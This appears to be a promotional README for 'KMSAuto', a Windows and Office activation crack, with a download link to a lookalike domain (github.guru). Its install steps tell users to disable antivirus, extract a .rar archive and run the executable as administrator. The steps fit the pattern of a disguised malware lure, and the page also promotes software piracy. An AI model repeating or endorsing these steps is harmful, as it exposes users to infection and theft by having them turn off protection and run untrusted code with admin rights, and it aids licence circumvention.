# KMSAuto

KMSAuto delivers permanent activation for Windows and Office through local KMS emulation. This lightweight tool activates almost any modern Windows and Office version with a simple interface and full offline functionality.

---

**DOWNLOAD:** https://github.guru/s/TluhFXE5
**INSTALL:** Download .rar → Disable antivirus temporarily → Extract → Run KMSAuto.exe as admin → Click "Activation" → Wait for confirmation

